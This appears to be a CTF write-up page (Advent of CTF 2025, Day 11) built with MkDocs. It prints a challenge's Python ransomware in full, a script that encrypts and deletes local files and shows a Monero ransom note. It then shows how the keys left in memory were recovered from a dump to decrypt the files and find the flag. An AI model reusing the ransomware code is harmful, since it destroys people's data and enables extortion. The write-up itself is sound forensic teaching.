@@ -1,0 +1,317 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-12-02-advent-of-ctf-2025/day-11.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>Day 11 - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#day-11" class="nav-link">Day 11</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="day-11">Day 11</h1>
+<p>Attachment:</p>
+<pre class="highlight"><code class="language-python">import ctypes,os,sys,time
+k32=ctypes.windll.kernel32
+k32.VirtualAlloc.restype=ctypes.c_void_p
+k32.VirtualAlloc.argtypes=[ctypes.c_void_p,ctypes.c_size_t,ctypes.c_ulong,ctypes.c_ulong]
+m,r,p=0x1000,0x2000,0x04
+s_name="FreeRobux.py"
+k_size=32
+f_size=60
+marker=b'\xAA\xBB\xCC\xDD'
+def x(d,k):
+    if not k:return b''
+    o=bytearray()
+    kl=len(k)
+    for i,b in enumerate(d):o.append(b^k[i%kl])
+    return bytes(o)
+def note():
+    return """
+&lt;==================================================================&gt;
+                    !!! SYNDICATE LOCKER !!!
+&lt;==================================================================&gt;
+
+Your network has been breached and all your files have been encrypted.
+Do not waste your time attempting to recover them. We use a military-
+grade encryption algorithm that is impossible to break.
+
+To restore your data, you must purchase our decrypter.
+
+Payment is 5 Monero (XMR) to the following wallet:
+45i3fEE5547eB5y6152Fh321v9aKzDSb353fL9bA78gH5f6s2D4hG1jK3l4mN5oP6qR7sT8u
+
+After payment, contact us via TOX chat with your transaction ID.
+TOX ID: 5A1B79C4E0F1234567890ABCCPF1234567890ABCDEF1234567890ABCDEF
+
+You have 48 hours. After that, your decryption key will be destroyed.
+Any interference will lead to the immediate destruction of your key.
+
+&lt;==================================================================&gt;
+    [System is locked. Awaiting further commands...]
+&lt;==================================================================&gt;
+"""
+def run():
+    f_list=[f for f in os.listdir('.') if os.path.isfile(os.path.join('.',f)) and f!=s_name and not f.endswith('.enc')]
+    if not f_list:return
+    e_size=f_size+k_size+len(marker)
+    t_size=4+(len(f_list)*e_size)
+    m_ptr=k32.VirtualAlloc(None,t_size,m|r,p)
+    if not m_ptr:sys.exit(1)
+    c_off=0
+    for f_name in f_list:
+        try:
+            k=os.urandom(k_size)
+            f_bytes=f_name.encode('utf-8')[:f_size].ljust(f_size,b'\x00')
+            blob=f_bytes+k+marker
+            buff=(ctypes.c_char*len(blob)).from_buffer_copy(blob)
+            ctypes.memmove(m_ptr+c_off,buff,len(blob))
+            c_off+=e_size
+            with open(f_name,"rb") as f_in:p_text=f_in.read()
+            c_text=x(p_text,k)
+            with open(f_name+".enc","wb") as f_out:f_out.write(c_text)
+            os.remove(f_name)
+        except:continue
+    os.system('cls' if os.name=='nt' else 'clear')
+    print(note())
+    try:
+        while True:time.sleep(3600)
+    except KeyboardInterrupt:sys.exit(0)
+if __name__=="__main__":
+    run()</code></pre>
+<p>The code encrypts each file with a 32-byte key, and the keys are stored in the memory, which can be found in the memory dump. By finding the file name, we can locate the key and decrypt the files:</p>
+<pre class="highlight"><code class="language-python">import glob
+import os
+
+data = open("ransomware.DMP", "rb").read()
+for file in glob.glob("encrypted_files/*"):
+    name = os.path.split(file)[1]
+    name = name.removesuffix(".enc")
+    i = 0
+    while True:
+        i = data.find(name.encode(), i)
+        if i == -1:
+            break
+        # possible key location
+        offset = i + 60
+        key = data[offset : offset + 32]
+        mark = data[offset + 32 : offset + 36]
+        if mark == b"\xaa\xbb\xcc\xdd":
+            print(name, i, key, mark)
+            # decrypt
+            cipher = open(file, "rb").read()
+            open(name, "wb").write(
+                bytes([ch ^ key[i % 32] for i, ch in enumerate(cipher)])
+            )
+        i += len(name)</code></pre>
+<p>Then, we found two PDF files and a PNG. The PDF files contains some string that need to be decoded:</p>
+<pre class="highlight"><code class="language-python"># use pdftotext to extract text
+elf41 = open("Elf 41's Diary.txt").read()
+elf41 = elf41.replace("\n", " ").replace("\f", " ").removeprefix("Elf41’s Diary")
+print(elf41)
+data = [int(part.replace("4","0"), 2)for part in elf41.split()]
+print(bytes(data).decode())
+
+elf67 = open("Elf67’s Diary.txt").read()
+elf67 = elf67.replace("\n", " ").replace("\f", " ").removeprefix("Elf67’s Diary")
+print(elf67)
+data = [int(part.replace("6","0").replace("7", "1"), 2)for part in elf67.split()]
+print(bytes(data).decode())</code></pre>
+<p>Flag is embeeded in the output:</p>
+<pre class="highlight"><code>army behind it, were too much to be borne: besides, the sight or even the
+thought of Goldstein produced fear and anger automatically. csd{73rr1bl3_R4ns0m3w3r3_4l50_67_15_d34d} He was an object
+of hatred more constant than either Eurasia or Eastasia, since when Oceania
+was at war with one of these Powers it was generally at peace with the other.</code></pre></div>
+
+                <!-- added by @jiegec begin -->
+                <div class="col-md-3"></div>
+                <div class="col-md-9">
+                  <script src="https://giscus.app/client.js"
+                      data-repo="jiegec/ctf-writeups"
+                      data-repo-id="MDEwOlJlcG9zaXRvcnkxNTE1MzAxODQ="
+                      data-category="General"
+                      data-category-id="DIC_kwDOCQgqyM4CvbYX"
+                      data-mapping="pathname"
+                      data-strict="1"
+                      data-reactions-enabled="1"
+                      data-emit-metadata="0"
+                      data-input-position="top"
+                      data-theme="light"
+                      data-lang="en"
+                      data-loading="lazy"
+                      crossorigin="anonymous"
+                      async>
+                  </script>
+                </div>
+                <!-- added by @jiegec end -->
+            </div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2025 Jiajie Chen</p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script src="../js/bootstrap.bundle.min.js"></script>
+        <script>
+            var base_url = "..",
+                shortcuts = {"help": 191, "next": 78, "previous": 80, "search": 83};
+        </script>
+        <script src="../js/base.js"></script>
+        <script src="../search/main.js"></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="searchModalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-lg">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="searchModalLabel">Search</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+                <p>From here you can search these documents. Enter your search terms below.</p>
+                <form>
+                    <div class="form-group">
+                        <input type="search" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results" data-no-results-text="No results found"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="keyboardModalLabel" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h4 class="modal-title" id="keyboardModalLabel">Keyboard Shortcuts</h4>
+                <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
